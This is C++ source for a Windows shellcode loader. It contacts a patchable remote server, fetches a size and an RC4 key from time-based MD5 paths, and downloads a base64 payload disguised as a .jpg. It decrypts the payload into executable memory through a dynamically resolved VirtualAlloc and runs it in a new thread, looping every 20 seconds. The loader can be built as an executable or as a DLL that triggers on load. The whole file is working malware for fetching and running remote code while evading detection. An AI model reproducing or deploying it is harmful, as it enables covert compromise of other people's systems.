//#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include<WinSock2.h>
#include <Ws2tcpip.h>

#include <windows.h>  
#include <string>
#include "b64/base64.h"

#include <iostream>
#include <time.h>
#include "rc4/ARC4.h"
#include "http/EdUrlParser.h"
//#define  CPPHTTPLIB_OPENSSL_SUPPORT

//#include "http/httplib.h"

#include "Md5/md5.h"

#include<winhttp.h>
#pragma comment(lib,"Winhttp.lib")
#pragma comment(lib,"ws2_32.lib")


//#include<direct.h>
//data段可读写  
//#pragma comment(linker, "/section:.data,WE")   
//不显示窗口  
//#pragma comment(linker,"/subsystem:\"console\" /entry:\"mainCRTStartup\"") 

//#pragma comment(linker, "/INCREMENTAL:NO")
typedef PVOID(*M) (DWORD, DWORD, DWORD, DWORD);


char target[MAX_PATH] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
						"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";








const char obscure[] = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB";

typedef DWORD(WINAPI *CODE) (LPVOID lpParamter);
char * shellcode = NULL;
int shellcode_size = 0; 

std::string Request(std::string target, std::string path) {
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	BOOL  useSSL = FALSE;
	INTERNET_PORT port;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	std::string reqResult;
	
	EdUrlParser* url = EdUrlParser::parseUrl(target);
	
	std::string p = url->port;
	if (p.length() > 1) {
		
		//std::cout <<p <<"   "<<p.substr(2) << std::endl;
		port = std::atoi(p.c_str());
		
	}
	if (url->scheme == "https") {
		useSSL = TRUE;
		if (url->port == "") {
			port = 443;
		}
	}
	else {
		if (url->port == "")
			port = 80;
	}




	std::wstring h = std::wstring(url->hostName.begin(), url->hostName.end());
	std::string strBasePath = url->path;
	char last = strBasePath.back();
	if (strcmp(&last,"/")) {
		strBasePath += "/";
	}
	strBasePath += path;
	std::cout << "request path:" << strBasePath <<"    port:"<< port<<std::endl;
	std::wstring basePath = std::wstring(strBasePath.begin(), strBasePath.end());
	wchar_t* host = (wchar_t*)h.c_str();

	wchar_t* object = (wchar_t*)basePath.c_str();


	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"WinHTTP Example/1.0",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, host,
			port, 0);

	// Create an HTTP request handle.
	if (hConnect)

		hRequest = WinHttpOpenRequest(hConnect, L"GET", object,
			NULL, WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			useSSL ? WINHTTP_FLAG_SECURE : 0);





#ifndef _WIN64
	LPCWSTR header = L"Accept-platform: x86\n";
	SIZE_T len = lstrlenW(header);
	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
#else
	LPCWSTR header = L"Accept-platform: x64\n";
	SIZE_T len = lstrlenW(header);
	WinHttpAddRequestHeaders(hRequest, header, len, WINHTTP_ADDREQ_FLAG_ADD);
#endif


	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS, 0,
			WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);


	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
				return "";


			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				return "";
				dwSize = 0;
			}
			else
			{
				// Read the data.
				ZeroMemory(pszOutBuffer, dwSize + 1);

				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
					dwSize, &dwDownloaded))
					return "";
				else
					reqResult += pszOutBuffer;

				// Free the memory allocated to the buffer.
				delete[] pszOutBuffer;
			}
		} while (dwSize > 0);
	}


	// Report any errors.
	if (!bResults)
		return "";

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
	std::cout << "response:" << reqResult << std::endl;
	return reqResult;
}



std::string GenerateUri()
{
	time_t myt = time(NULL);
	int key = int(int(myt) / 100);
	std::string u = string(obscure) + std::to_string(key);
	return MD5_(u).toStr();
}
bool GetShellCodeSize()
{
	
	string res = Request(target,"my/get_size");
	if (res=="")return false;
	shellcode_size = std::atoi(res.c_str());
	shellcode = (char*)malloc(shellcode_size);
	if (shellcode != 0) {
		return true;
	}
	else {
		return false;
	}
}

std::string GetKey()
{
	if (GetShellCodeSize() == false) {
		return "";
	}
	
	
	string res = Request(target,GenerateUri());
	return res;
}
void LoadShellCode(char *shellcode)
{
	HMODULE hDllLib = LoadLibrary("Kernel32.dll");
	FARPROC fpFun = GetProcAddress(hDllLib, "VirtualAlloc");
	M VirtualAlloc_ = (M)*fpFun;
	
	void* p = NULL;
	p = VirtualAlloc_(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy_s(p, shellcode_size, shellcode, shellcode_size);
	
	CODE code = (CODE)p;
	//code();
	HANDLE hThread = CreateThread(NULL, 0, code, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);



	
	
}

void DecPayload()
{
	std::string key = GetKey();
	
	if (key == "")return;
	time_t myt = time(NULL);
	int filename = int(int(myt) / 100);
	std::string url = std::to_string(filename) + ".jpg";
	
	string res = Request(target,url);
	if (res=="")return;
	std::string body = res;
	
	std::string payload = base64_decode(body);
	char * c_payload = (char *)malloc(shellcode_size);
	memcpy_s(c_payload, shellcode_size, payload.c_str(), shellcode_size);
	ARC4 rc4;
	if (key.length() == 0) {
		return;
	}
	rc4.setKey((unsigned char*)key.c_str(), key.length());
	rc4.encrypt(c_payload, shellcode, shellcode_size);
	
	LoadShellCode(shellcode);
}


extern "C" _declspec(dllexport) void Invoke();
void Invoke()
{
	
	Sleep(3000);
	while (true) {
		try {
			
			DecPayload();
			Sleep(20000);
		}
		catch (const std::exception& e)
		{
			
		}
		
	}
	return ;

}



int main()
{  
	Invoke();
	return 0;
	
}  
int CALLBACK WinMain(
	_In_  HINSTANCE hInstance,
	_In_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
) {
	Invoke();
	return 0;
}
BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		
		break;

	case DLL_PROCESS_DETACH:
		
		break;

	case DLL_THREAD_ATTACH:
		
		break;

	case DLL_THREAD_DETACH:
		
		break;
	}
	
	Invoke();
	return (TRUE);

}
